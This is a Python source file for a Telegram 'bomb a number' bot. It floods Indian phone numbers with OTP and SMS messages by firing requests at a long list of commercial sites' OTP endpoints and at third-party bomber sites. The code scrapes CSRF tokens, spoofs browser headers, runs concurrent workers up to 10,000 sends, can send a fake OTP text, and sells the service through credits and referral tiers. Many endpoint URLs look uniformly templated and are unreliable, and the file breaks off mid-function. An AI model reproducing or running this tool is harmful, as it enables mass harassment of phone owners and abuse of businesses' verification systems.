1# language: Python 3.10+, file: bombot.py
# runtime: python bombot.py
# render: Web Service, python 3, start command: python bombot.py
# deps: pip install python-telegram-bot==21.6 aiohttp

import os
import asyncio
import sqlite3
import time
import random
import re
import logging

import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
OWNER_ID = int(os.environ.get('OWNER_ID', '0')) or None
PORT = int(os.environ.get('PORT', '10000'))
RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', '').rstrip('/')

OWNER_USERNAME = '@deathalive07'

CHANNELS = [
    {'name': 'Trusted Backup',  'url': 'https://t.me/trusteddealers_07', 'username': '@trusteddealers_07'},
    {'name': 'Trusted Dealers', 'url': 'https://t.me/trusteddealers07',  'username': '@trusteddealers07'},
    {'name': 'Trust Me Baby',   'url': 'https://t.me/trustmebaby07',     'username': '@trustmebaby07'},
]

JOIN_BONUS = 200
REFER_BONUS = 100
PRIME_REFER_THRESHOLD = 100
PROTECT_UNLOCK_REFERS = 10
PROTECT_MAX_SLOTS = 100
CONTINUOUS_ENTRY_COST = 5
AUTO_RATE = 0.5
FIREBASE_RATE = 1.0
ONLINE_WINDOW_MIN = 15
ALLOW_TRANSFER = True
BOMB_DELAY = 0.08
BOMB_CONCURRENCY = 8
HARD_CAP = 10000
REQ_TIMEOUT = 3

DEFAULT_MESSAGE = 'OTP: 482916. Do not share with anyone.'

BROWSER_UA = ('Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 '
              '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')

FAIL_MARKERS = [
    '"error"', '"success":false', '"success": false', '"status":"fail', '"status": "fail',
    'invalid', 'captcha', 'csrf', 'too many', 'blocked', 'forbidden', 'denied',
    'not allowed', 'rate limit', 'verification failed', 'please try',
]
SUCCESS_MARKERS = [
    '"success":true', '"success": true', '"status":"success"', '"status": "success"',
    'otp sent', 'otp_sent', 'sent successfully', 'message sent', 'sms sent',
]

app_bot = None
app_instance = None

# ============================================================
# GATEWAY POOL
# ============================================================

GATEWAY_POOL = [
    {'name': 'zomato',       'url': 'https://www.zomato.com/php/o2_api_handler.php',       'base': 'https://www.zomato.com/',       'phone_field': 'mobile', 'extra': {'action': 'send_otp'}, 'json': False},
    {'name': 'swiggy',       'url': 'https://www.swiggy.com/dapi/auth/send_otp',           'base': 'https://www.swiggy.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'dunzo',        'url': 'https://www.dunzo.com/api/v1/auth/sendOtp',           'base': 'https://www.dunzo.com/',        'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'faasos',       'url': 'https://www.faasos.com/api/v1/otp/send',              'base': 'https://www.faasos.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'eatsure',      'url': 'https://www.eatsure.com/api/v1/otp/send',             'base': 'https://www.eatsure.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'freshmenu',    'url': 'https://www.freshmenu.com/api/v1/send-otp',           'base': 'https://www.freshmenu.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'bigbasket',    'url': 'https://www.bigbasket.com/auth/otp/send/',            'base': 'https://www.bigbasket.com/',    'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'grofers',      'url': 'https://www.grofers.com/api/v1/send_otp',             'base': 'https://www.grofers.com/',      'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'blinkit',      'url': 'https://blinkit.com/api/v1/send_otp',                 'base': 'https://blinkit.com/',          'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'zepto',        'url': 'https://www.zeptonow.com/api/v1/otp/send',            'base': 'https://www.zeptonow.com/',     'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'jiomart',      'url': 'https://www.jiomart.com/api/v1/otp/send',             'base': 'https://www.jiomart.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'dmart',        'url': 'https://www.dmart.in/api/v1/otp/send',                'base': 'https://www.dmart.in/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'naturebasket', 'url': 'https://www.naturesbasket.co.in/api/v1/otp/send',     'base': 'https://www.naturesbasket.co.in/', 'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'myntra',       'url': 'https://www.myntra.com/gateway/v2/user/sendotp',      'base': 'https://www.myntra.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'ajio',         'url': 'https://www.ajio.com/api/v1/otp/send',                'base': 'https://www.ajio.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'nykaa',        'url': 'https://www.nykaa.com/appapi/v1/otp/send',            'base': 'https://www.nykaa.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'tatacliq',     'url': 'https://www.tatacliq.com/api/v1/send-otp',            'base': 'https://www.tatacliq.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'lenskart',     'url': 'https://www.lenskart.com/api/v1/customer/sendotp',    'base': 'https://www.lenskart.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'pepperfry',    'url': 'https://www.pepperfry.com/rest/V1/otp/send',          'base': 'https://www.pepperfry.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'fabindia',     'url': 'https://www.fabindia.com/api/v1/otp/send',            'base': 'https://www.fabindia.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'meesho',       'url': 'https://www.meesho.com/api/v1/otp/send',              'base': 'https://www.meesho.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'snapdeal',     'url': 'https://www.snapdeal.com/api/v1/otp/send',            'base': 'https://www.snapdeal.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'flipkart',     'url': 'https://www.flipkart.com/api/6/user/sendOtp',         'base': 'https://www.flipkart.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'croma',        'url': 'https://www.croma.com/api/v1/otp/send',               'base': 'https://www.croma.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'vijaysales',   'url': 'https://www.vijaysales.com/api/v1/otp/send',          'base': 'https://www.vijaysales.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'reliancedigital','url': 'https://www.reliancedigital.in/api/v1/otp/send',    'base': 'https://www.reliancedigital.in/', 'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'makemytrip',   'url': 'https://www.makemytrip.com/api/sendotp',              'base': 'https://www.makemytrip.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'goibibo',      'url': 'https://www.goibibo.com/user/sendotp/',               'base': 'https://www.goibibo.com/',      'phone_field': 'mobile', 'extra': {}, 'json': False},
    {'name': 'redbus',       'url': 'https://www.redbus.in/api/sendOtp',                   'base': 'https://www.redbus.in/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'ixigo',        'url': 'https://www.ixigo.com/api/v1/otp/send',               'base': 'https://www.ixigo.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'abhibus',      'url': 'https://www.abhibus.com/api/v1/otp/send',             'base': 'https://www.abhibus.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'yatra',        'url': 'https://www.yatra.com/api/v1/otp/send',               'base': 'https://www.yatra.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'easemytrip',   'url': 'https://www.easemytrip.com/api/v1/otp/send',          'base': 'https://www.easemytrip.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'cleartrip',    'url': 'https://www.cleartrip.com/api/v1/otp/send',           'base': 'https://www.cleartrip.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'pharmeasy',    'url': 'https://pharmeasy.in/api/v1/send-otp',                'base': 'https://pharmeasy.in/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'netmeds',      'url': 'https://www.netmeds.com/api/v1/otp/send',             'base': 'https://www.netmeds.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'tata1mg',      'url': 'https://www.1mg.com/api/v1/otp/send',                 'base': 'https://www.1mg.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'practo',       'url': 'https://www.practo.com/api/v1/send_otp',              'base': 'https://www.practo.com/',       'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'apollo247',    'url': 'https://www.apollo247.com/api/v1/otp/send',           'base': 'https://www.apollo247.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'medplus',      'url': 'https://www.medplusmart.com/api/v1/otp/send',         'base': 'https://www.medplusmart.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'cultfit',      'url': 'https://www.cult.fit/api/v1/otp/send',                'base': 'https://www.cult.fit/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'healthifyme',  'url': 'https://www.healthifyme.com/api/v1/send-otp',         'base': 'https://www.healthifyme.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'curefit',      'url': 'https://www.cure.fit/api/v1/otp/send',                'base': 'https://www.cure.fit/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'dream11',      'url': 'https://www.dream11.com/api/v1/send-otp',             'base': 'https://www.dream11.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'mpl',          'url': 'https://www.mpl.live/api/v1/otp/send',                'base': 'https://www.mpl.live/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'rummycircle',  'url': 'https://www.rummycircle.com/api/v1/send-otp',         'base': 'https://www.rummycircle.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'my11circle',   'url': 'https://www.my11circle.com/api/v1/otp/send',          'base': 'https://www.my11circle.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'mpokket',      'url': 'https://www.mpokket.in/api/v1/send-otp',              'base': 'https://www.mpokket.in/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'moneyview',    'url': 'https://www.moneyview.in/api/v1/otp/send',            'base': 'https://www.moneyview.in/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'coindcx',      'url': 'https://coindcx.com/api/v1/otp/send',                 'base': 'https://coindcx.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'wazirx',       'url': 'https://wazirx.com/api/v2/send_otp',                  'base': 'https://wazirx.com/',           'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'zerodha',      'url': 'https://kite.zerodha.com/api/login/otp',              'base': 'https://kite.zerodha.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'upstox',       'url': 'https://api.upstox.com/v2/login/send-otp',            'base': 'https://upstox.com/',           'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'groww',        'url': 'https://groww.in/api/v1/otp/send',                    'base': 'https://groww.in/',             'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'angelone',     'url': 'https://www.angelone.in/api/v1/otp/send',             'base': 'https://www.angelone.in/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'delhivery',    'url': 'https://www.delhivery.com/api/v1/otp/send',           'base': 'https://www.delhivery.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'dtdc',         'url': 'https://www.dtdc.in/api/v1/otp/send',                 'base': 'https://www.dtdc.in/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'bluedart',     'url': 'https://www.bluedart.com/api/v1/otp/send',            'base': 'https://www.bluedart.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'porter',       'url': 'https://porter.in/api/v1/otp/send',                   'base': 'https://porter.in/',            'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'shadowfax',    'url': 'https://www.shadowfax.in/api/v1/otp/send',            'base': 'https://www.shadowfax.in/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'housing',      'url': 'https://housing.com/api/v1/otp/send',                 'base': 'https://housing.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': '99acres',      'url': 'https://www.99acres.com/api/v1/otp/send',             'base': 'https://www.99acres.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'magicbricks',  'url': 'https://www.magicbricks.com/api/v1/otp/send',         'base': 'https://www.magicbricks.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'nobroker',     'url': 'https://www.nobroker.in/api/v1/otp/send',             'base': 'https://www.nobroker.in/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'naukri',       'url': 'https://www.naukri.com/api/v1/otp/send',              'base': 'https://www.naukri.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'indeed',       'url': 'https://in.indeed.com/api/v1/otp/send',               'base': 'https://in.indeed.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'shine',        'url': 'https://www.shine.com/api/v1/otp/send',               'base': 'https://www.shine.com/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'urbancompany', 'url': 'https://www.urbancompany.com/api/v1/send-otp',        'base': 'https://www.urbancompany.com/', 'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'firstcry',     'url': 'https://www.firstcry.com/api/sendotp',                'base': 'https://www.firstcry.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'bewakoof',     'url': 'https://www.bewakoof.com/api/v1/otp/send',            'base': 'https://www.bewakoof.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'jiocinema',    'url': 'https://www.jiocinema.com/api/v1/otp/send',           'base': 'https://www.jiocinema.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'sonyliv',      'url': 'https://www.sonyliv.com/api/v1/otp/send',             'base': 'https://www.sonyliv.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'hotstar',      'url': 'https://api.hotstar.com/api/v1/otp/send',             'base': 'https://www.hotstar.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'zee5',         'url': 'https://www.zee5.com/api/v1/otp/send',                'base': 'https://www.zee5.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'mytoolstown',  'url': 'https://mytoolstown.com/smsbomber/send.php',          'base': 'https://mytoolstown.com/smsbomber/',       'phone_field': 'mobile', 'extra': {}, 'json': False},
    {'name': 'greatonlinetools', 'url': 'https://greatonlinetools.com/smsbomber/send.php','base': 'https://greatonlinetools.com/smsbomber/', 'phone_field': 'mobile', 'extra': {}, 'json': False},
    {'name': 'callbomberz',  'url': 'https://www.callbomberz.in/unlimited-sms-bomber/send', 'base': 'https://www.callbomberz.in/unlimited-sms-bomber', 'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'nextbomb',     'url': 'https://nextbomb.in/sms-bomber/send',                 'base': 'https://nextbomb.in/sms-bomber',           'phone_field': 'mobile', 'extra': {}, 'json': True},
]

# ============================================================
# DB
# ============================================================

db = sqlite3.connect('bombot.db', check_same_thread=False)
db.row_factory = sqlite3.Row
cur = db.cursor()
cur.executescript('''
CREATE TABLE IF NOT EXISTS users (
  user_id INTEGER PRIMARY KEY, username TEXT, credits REAL DEFAULT 0,
  referred_by INTEGER, firebase_url TEXT, joined_at INTEGER, last_seen INTEGER,
  prime INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS admins (
  user_id INTEGER PRIMARY KEY, added_by INTEGER, added_at INTEGER
);
CREATE TABLE IF NOT EXISTS firebase_links (
  id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE,
  added_by INTEGER, active INTEGER DEFAULT 1, added_at INTEGER
);
CREATE TABLE IF NOT EXISTS tx_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT, from_user INTEGER, to_user INTEGER,
  amount REAL, type TEXT, note TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS sent_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT,
  gateway TEXT, mode TEXT, ok INTEGER, ts INTEGER
);
CREATE TABLE IF NOT EXISTS gateway_health (
  name TEXT PRIMARY KEY, alive INTEGER DEFAULT 1, last_checked INTEGER
);
CREATE TABLE IF NOT EXISTS protected_numbers (
  number TEXT PRIMARY KEY, user_id INTEGER, added_at INTEGER
);
''')
db.commit()

try:
    cur.execute('ALTER TABLE users ADD COLUMN prime INTEGER DEFAULT 0')
    db.commit()
except sqlite3.OperationalError:
    pass

for g in GATEWAY_POOL:
    cur.execute('INSERT OR IGNORE INTO gateway_health (name) VALUES (?)', (g['name'],))
db.commit()

# ============================================================
# HELPERS
# ============================================================

def now():
    return int(time.time())

def get_user(uid):
    cur.execute('SELECT * FROM users WHERE user_id = ?', (uid,))
    return cur.fetchone()

def touch_user(uid):
    cur.execute('UPDATE users SET last_seen = ? WHERE user_id = ?', (now(), uid))
    db.commit()

def create_user(uid, username, referred_by=None):
    cur.execute('INSERT OR IGNORE INTO users (user_id, username, credits, referred_by, joined_at, last_seen) VALUES (?,?,?,?,?,?)',
                (uid, username, JOIN_BONUS, referred_by, now(), now()))
    db.commit()

def add_credits(uid, amount, type_, note=''):
    cur.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))
    cur.execute('INSERT INTO tx_log (to_user, amount, type, note, ts) VALUES (?,?,?,?,?)', (uid, amount, type_, note, now()))
    db.commit()

def sub_credits(uid, amount, type_, note=''):
    cur.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, uid))
    cur.execute('INSERT INTO tx_log (from_user, amount, type, note, ts) VALUES (?,?,?,?,?)', (uid, amount, type_, note, now()))
    db.commit()

def is_admin(uid):
    if OWNER_ID and uid == OWNER_ID:
        return True
    cur.execute('SELECT 1 FROM admins WHERE user_id = ?', (uid,))
    return cur.fetchone() is not None

def is_owner(uid):
    return OWNER_ID is not None and uid == OWNER_ID

def is_prime(uid):
    cur.execute('SELECT prime FROM users WHERE user_id = ?', (uid,))
    row = cur.fetchone()
    return bool(row and row['prime'])

def set_prime(uid, value):
    cur.execute('UPDATE users SET prime = ? WHERE user_id = ?', (1 if value else 0, uid))
    db.commit()

def maybe_auto_prime(uid):
    cur.execute('SELECT COUNT(*) c FROM users WHERE referred_by = ?', (uid,))
    count = cur.fetchone()['c']
    if count >= PRIME_REFER_THRESHOLD and not is_prime(uid):
        set_prime(uid, True)
        return True
    return False

def valid_indian(num):
    clean = re.sub(r'\D', '', str(num))
    ten = clean[2:] if clean.startswith('91') and len(clean) == 12 else clean
    return ten if re.match(r'^[6-9]\d{9}$', ten) else None

def live_gateways():
    out = []
    for g in GATEWAY_POOL:
        cur.execute('SELECT alive FROM gateway_health WHERE name = ?', (g['name'],))
        row = cur.fetchone()
        if not row or row['alive'] == 1:
            out.append(g)
    return out

def live_firebase():
    cur.execute('SELECT url FROM firebase_links WHERE active = 1')
    return [r['url'] for r in cur.fetchall()]

def is_protected(number):
    clean = re.sub(r'\D', '', str(number))
    ten = clean[2:] if clean.startswith('91') and len(clean) == 12 else clean
    cur.execute('SELECT 1 FROM protected_numbers WHERE number = ?', (ten,))
    return cur.fetchone() is not None

def protect_number(number, user_id):
    clean = re.sub(r'\D', '', str(number))
    ten = clean[2:] if clean.startswith('91') and len(clean) == 12 else clean
    cur.execute('INSERT OR IGNORE INTO protected_numbers (number, user_id, added_at) VALUES (?,?,?)',
                (ten, user_id, now()))
    db.commit()

def unprotect_number(number, user_id=None):
    clean = re.sub(r'\D', '', str(number))
    ten = clean[2:] if clean.startswith('91') and len(clean) == 12 else clean
    if user_id:
        cur.execute('DELETE FROM protected_numbers WHERE number = ? AND user_id = ?', (ten, user_id))
    else:
        cur.execute('DELETE FROM protected_numbers WHERE number = ?', (ten,))
    db.commit()

def user_protected(user_id):
    cur.execute('SELECT number FROM protected_numbers WHERE user_id = ? ORDER BY added_at DESC', (user_id,))
    return [r['number'] for r in cur.fetchall()]

def protect_slots_used():
    cur.execute('SELECT COUNT(*) c FROM protected_numbers')
    return cur.fetchone()['c']

def user_refer_count(user_id):
    cur.execute('SELECT COUNT(*) c FROM users WHERE referred_by = ?', (user_id,))
    return cur.fetchone()['c']

def user_can_protect(user_id):
    if is_prime(user_id):
        return True
    return user_refer_count(user_id) >= PROTECT_UNLOCK_REFERS

# ============================================================
# KEYBOARDS
# ============================================================

def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('💣 Bomb a Number', callback_data='menu_bomb')],
        [InlineKeyboardButton('🛡 Protect My Number', callback_data='menu_protect')],
        [InlineKeyboardButton('💰 My Credits', callback_data='menu_credits'),
         InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
        [InlineKeyboardButton('💸 Transfer', callback_data='menu_transfer'),
         InlineKeyboardButton('🔥 Firebase', callback_data='menu_firebase')],
        [InlineKeyboardButton('🛠 Admin Panel', callback_data='menu_admin'),
         InlineKeyboardButton('👑 Owner Panel', callback_data='menu_owner')],
    ])

def kb_gate():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('📢 Trusted Backup', url='https://t.me/trusteddealers_07')],
        [InlineKeyboardButton('📢 Trusted Dealers', url='https://t.me/trusteddealers07')],
        [InlineKeyboardButton('📢 Trust Me Baby', url='https://t.me/trustmebaby07')],
        [InlineKeyboardButton('✅ I Joined', callback_data='gate_recheck')],
    ])

def kb_bomb_amount(prime=False):
    rows = [
        [InlineKeyboardButton('10', callback_data='amt_10'),
         InlineKeyboardButton('50', callback_data='amt_50'),
         InlineKeyboardButton('100', callback_data='amt_100')],
        [InlineKeyboardButton('500', callback_data='amt_500'),
         InlineKeyboardButton('1000', callback_data='amt_1000')],
    ]
    if prime:
        rows.append([InlineKeyboardButton('♾️ Until I Stop (prime)', callback_data='amt_cont')])
    rows.append([InlineKeyboardButton('❌ Cancel', callback_data='cancel')])
    return InlineKeyboardMarkup(rows)

def kb_bomb_message():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('⏭ Skip (use default)', callback_data='msg_skip')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_bomb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('⚡ Auto (1cr = 2 SMS)', callback_data='mode_auto')],
        [InlineKeyboardButton('🔥 Firebase (1cr = 1 SMS)', callback_data='mode_firebase')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_bomb_confirm(amount, mode):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('✅ Start', callback_data=f'go_{mode}_{amount}')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('➕ Add Credit', callback_data='adm_addcredit'),
         InlineKeyboardButton('➖ Remove Credit', callback_data='adm_remcredit')],
        [InlineKeyboardButton('➕ Add Firebase', callback_data='adm_addfb'),
         InlineKeyboardButton('➖ Remove Firebase', callback_data='adm_remfb')],
        [InlineKeyboardButton('📊 Firebase List', callback_data='adm_listfb')],
        [InlineKeyboardButton('⚡ Gateway List', callback_data='adm_listgw')],
        [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')],
    ])

def kb_owner():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('📊 Full Stats', callback_data='own_stats'),
         InlineKeyboardButton('🟢 Online Devices', callback_data='own_online')],
        [InlineKeyboardButton('👤 Add Admin', callback_data='own_addadm'),
         InlineKeyboardButton('🗑 Remove Admin', callback_data='own_remadm')],
        [InlineKeyboardButton('📋 Admin List', callback_data='own_listadm'),
         InlineKeyboardButton('📢 Broadcast', callback_data='own_broadcast')],
        [InlineKeyboardButton('⭐ Grant Prime', callback_data='own_grantprime'),
         InlineKeyboardButton('🚫 Revoke Prime', callback_data='own_revokeprime')],
        [InlineKeyboardButton('📋 Prime List', callback_data='own_listprime')],
        [InlineKeyboardButton('🛡 Protected Numbers', callback_data='own_protected')],
        [InlineKeyboardButton('⚙️ Gateway Health', callback_data='own_gwhealth'),
         InlineKeyboardButton('🔥 Firebase List', callback_data='own_fblist')],
        [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')],
    ])

def kb_protect(unlocked=True, slots_left=PROTECT_MAX_SLOTS):
    rows = []
    if unlocked and slots_left > 0:
        rows.append([InlineKeyboardButton('➕ Add Number', callback_data='prot_add')])
    elif unlocked and slots_left <= 0:
        rows.append([InlineKeyboardButton('⛔ Slots Full', callback_data='noop')])
    else:
        rows.append([InlineKeyboardButton('🔒 Locked (10 refs)', callback_data='noop')])
    rows.append([InlineKeyboardButton('📋 My Protected', callback_data='prot_list')])
    rows.append([InlineKeyboardButton('➖ Remove Number', callback_data='prot_rem')])
    rows.append([InlineKeyboardButton('⬅️ Back', callback_data='menu_main')])
    return InlineKeyboardMarkup(rows)

state = {}
stop_events = {}

# ============================================================
# SEND ENGINE
# ============================================================

CSRF_PATTERNS = [
    r'name=["\']csrf[_-]?token["\']\s+value=["\']([^"\']+)["\']',
    r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
    r'name=["\']authenticity_token["\']\s+value=["\']([^"\']+)["\']',
    r'"csrf[_-]?token"\s*:\s*"([^"]+)"',
    r'"csrfToken"\s*:\s*"([^"]+)"',
]

def extract_csrf(html):
    for pat in CSRF_PATTERNS:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

def classify_response(status, body):
    if status not in (200, 201, 202):
        return False
    if not body:
        return False
    low = body.lower()
    for bad in FAIL_MARKERS:
        if bad in low:
            return False
    for good in SUCCESS_MARKERS:
        if good in low:
            return True
    return True

async def fire_gateway(session, gateway, phone, message=None):
    data = {gateway['phone_field']: phone}
    data.update(gateway.get('extra', {}))
    if message:
        data['message'] = message
    headers = {
        'User-Agent': BROWSER_UA,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-IN,en;q=0.9',
    }
    csrf = None
    try:
        if gateway.get('base'):
            try:
                async with session.get(gateway['base'], headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                                       allow_redirects=True) as rbase:
                    html = await rbase.text()
                    csrf = extract_csrf(html)
                    headers['Referer'] = gateway['base']
                    headers['Origin'] = gateway['base'].rstrip('/')
            except Exception:
                pass

        if csrf:
            data['csrf_token'] = csrf
            data['_token'] = csrf

        if gateway['json']:
            headers['Content-Type'] = 'application/json'
            async with session.post(gateway['url'], json=data, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                                    allow_redirects=True) as r:
                body = await r.text()
                return classify_response(r.status, body)
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            async with session.post(gateway['url'], data=data, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                                    allow_redirects=True) as r:
                body = await r.text()
                return classify_response(r.status, body)
    except Exception:
        return False

async def fire_firebase(session, url, phone, message=None):
    payload = {
        'phone': phone,
        'mobile': phone,
        'number': phone,
        'message': message or DEFAULT_MESSAGE,
        'msg': message or DEFAULT_MESSAGE,
    }
    try:
        async with session.post(url, json=payload,
                                timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                                allow_redirects=True) as r:
            body = await r.text()
            return classify_response(r.status, body)
    except Exception:
        return False

async def bomb_run(app, chat_id, user_id, phone, amount, mode, message=None, continuous=False):
    gw_list = live_gateways()
    fb_list = live_firebase()
    if mode == 'auto' and not gw_list:
        return {'sent': 0, 'ok': 0, 'err': 'no live gateways'}
    if mode == 'firebase' and not fb_list:
        return {'sent': 0, 'ok': 0, 'err': 'no live firebase links'}

    target_amount = HARD_CAP if continuous else min(amount, HARD_CAP)

    run_id = f'{user_id}_{int(time.time())}'
    stop_ev = asyncio.Event()
    stop_events[run_id] = stop_ev

    label = f'∞ (cap {HARD_CAP})' if continuous else str(target_amount)
    progress_msg = await app.bot.send_message(
        chat_id, f'⏳ firing 0/{label}...')

    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton('🛑 Stop', callback_data=f'stop_{run_id}')],
    ])

    try:
        await app.bot.edit_message_reply_markup(
            chat_id=chat_id, message_id=progress_msg.message_id,
            reply_markup=stop_kb)
    except Exception:
        pass

    sent = 0
    ok = 0
    lock = asyncio.Lock()
    cursor = 0

    async with aiohttp.ClientSession() as session:
        async def worker():
            nonlocal sent, ok, cursor
            while True:
                if stop_ev.is_set():
                    return
                async with lock:
                    i = cursor
                    cursor += 1
                if i >= target_amount:
                    return
                if stop_ev.is_set():
                    return

                if mode == 'auto':
                    gw = random.choice(gw_list)
                    success = await fire_gateway(session, gw, phone, message=message)
                    cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                (user_id, phone, gw['name'], 'auto', 1 if success else 0, now()))
                else:
                    fb = random.choice(fb_list)
                    success = await fire_firebase(session, fb, phone, message=message)
                    cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                (user_id, phone, 'firebase', 'firebase', 1 if success else 0, now()))
                db.commit()

                async with lock:
                    sent += 1
                    if success:
                        ok += 1
                    if sent % 5 == 0 or sent == target_amount:
                        try:
                            await app.bot.edit_message_text(
